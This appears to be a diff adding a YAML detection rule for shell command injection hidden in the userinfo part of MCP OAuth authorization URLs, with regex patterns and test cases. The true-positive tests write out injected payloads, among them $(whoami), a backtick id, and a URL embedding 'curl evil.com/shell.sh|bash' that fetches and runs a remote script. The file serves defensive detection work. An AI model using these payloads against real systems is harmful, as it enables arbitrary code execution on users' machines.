@@ -1,0 +1,134 @@
+title: "MCP OAuth Authorization URL — Command Injection via URL Authority"
+id: ATR-2026-001306
+rule_version: 1
+status: active
+description: >
+  Detects command injection attempts embedded in MCP OAuth authorization URLs.
+  The attack encodes a shell command inside the userinfo portion of a URL
+  (user:pass@ authority component) using shell metacharacters like $(),
+  backticks, or pipe characters. When a vulnerable OAuth client processes
+  the URL and passes the userinfo to a shell command, the embedded payload
+  executes. The MCPSecBench probe uses
+  "http://user$(mate-calc)r:pass@127.0.0.1:9003/authorize?..." — the
+  $(mate-calc) fragment executes as a shell command on vulnerable systems.
+  This is a variant of the classic shell-injection-in-URL pattern applied to
+  the MCP OAuth flow's redirect/authorization endpoint handling.
+author: "ATR Community"
+date: "2026/06/12"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: stable
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM01:2025 - Prompt Injection"
+    - "LLM02:2025 - Insecure Output Handling"
+  owasp_agentic:
+    - "ASI04:2026 - Privilege Escalation via Agent"
+    - "ASI09:2026 - Insufficient Sandboxing"
+  mitre_atlas:
+    - "AML.T0051 - LLM Prompt Injection"
+    - "AML.T0010 - ML Supply Chain Compromise"
+  cve:
+    - "CVE patterns: shell metacharacter injection in URL authority field"
+
+compliance:
+  nist_ai_rmf:
+    - subcategory: "MS.2.7"
+      context: "Detection of shell command injection in MCP OAuth URLs supports runtime security measurement for AI agent authentication flows."
+      strength: primary
+    - subcategory: "MG.2.3"
+      context: "OAuth URL command injection must trigger immediate risk treatment to prevent arbitrary code execution in agent auth flows."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 operational control requires detection of command injection in MCP authentication URLs."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 risk treatment is supported by blocking OAuth URLs containing shell metacharacters."
+      strength: secondary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 cybersecurity requires detection of shell injection attacks targeting MCP authentication flows."
+      strength: primary
+    - article: "9"
+      context: "Article 9 risk management requires controls over command injection in MCP OAuth authorization flows."
+      strength: secondary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-oauth-command-injection
+  scan_target: mcp
+  confidence: high
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Security scanners that test OAuth endpoints with shell-metacharacter payloads and log the test URLs — these appear in scanner output files, not in production OAuth flows"
+    - "URL encoding edge cases where a percent-encoded dollar sign or backtick appears in a legitimate OAuth token — the pattern requires literal unencoded metacharacters"
+  conditions:
+    # Pattern 1: Shell command substitution $(cmd) or `cmd` in URL userinfo field
+    - field: content
+      operator: regex
+      value: 'https?://[^@\s]{0,100}(?:\$\([^)]{1,80}\)|`[^`]{1,80}`)[^@\s]{0,100}@[^\s]{3,200}/(?:authorize|oauth|auth|token|callback)'
+      description: "Shell command substitution $() or backtick in URL userinfo before @ in OAuth authorization URL"
+
+    # Pattern 2: Shell pipe/semicolon injection in URL userinfo
+    - field: content
+      operator: regex
+      value: 'https?://[a-zA-Z0-9_.-]{1,80}(?:[|;])[a-zA-Z0-9._/-]{1,80}@[^\s]{3,200}/(?:authorize|oauth|auth|token)'
+      description: "Shell pipe or semicolon in URL userinfo component before OAuth path"
+
+    # Pattern 3: Generic shell metachar in URL authority for any MCP/API endpoint
+    - field: content
+      operator: regex
+      value: 'https?://[^@\s]{1,100}\$\([a-zA-Z][\w-]{0,40}\)[^@\s]{0,100}@(?:127\.\d+\.\d+\.\d+|localhost|::1|\[::1\])'
+      description: "Shell command substitution in URL userinfo targeting loopback addresses (local MCP server attack)"
+
+response:
+  actions:
+    - alert
+    - block_tool
+  auto_response_threshold: critical
+  message_template: >
+    [ATR-2026-001306] CRITICAL: Shell command injection detected in MCP OAuth
+    authorization URL. The URL contains shell metacharacters ($(), backticks,
+    pipe, or semicolon) in the userinfo component. Processing this URL with a
+    vulnerable OAuth client would execute arbitrary shell commands. Block and
+    report this MCP server.
+
+test_cases:
+  true_positives:
+    - input: "http://user$(mate-calc)r:pass@127.0.0.1:9003/authorize?response_type=code"
+      expected: triggered
+      description: "MCPSecBench mcp-unauth-oauth-injection probe — $(mate-calc) shell injection in URL userinfo"
+    - input: "https://attacker:pass$(whoami)@oauth.internal/authorize?client_id=mcp"
+      expected: triggered
+      description: "$(whoami) shell injection in OAuth URL userinfo"
+    - input: "http://user`id`:pass@127.0.0.1:8080/oauth/token?code=abc"
+      expected: triggered
+      description: "Backtick id command injection in OAuth token URL"
+    - input: "https://user$(curl evil.com/shell.sh|bash)@localhost:9000/authorize"
+      expected: triggered
+      description: "Multi-command shell injection with curl pipe in OAuth URL"
+  true_negatives:
+    - input: "https://oauth.example.com/authorize?client_id=mcp&response_type=code&state=xyz"
+      expected: not_triggered
+      description: "Legitimate OAuth authorization URL — no userinfo, no shell metacharacters"
+    - input: "http://user:password@api.internal/data"
+      expected: not_triggered
+      description: "Basic auth URL with legitimate username:password — no shell metacharacters"
+    - input: "https://github.com/login/oauth/authorize?client_id=abc123"
+      expected: not_triggered
+      description: "Legitimate GitHub OAuth URL — no injection"
+    - input: "The OAuth flow requires a redirect_uri parameter: https://app.example.com/callback"
+      expected: not_triggered
+      description: "OAuth documentation mentioning redirect URI — no injection payload"
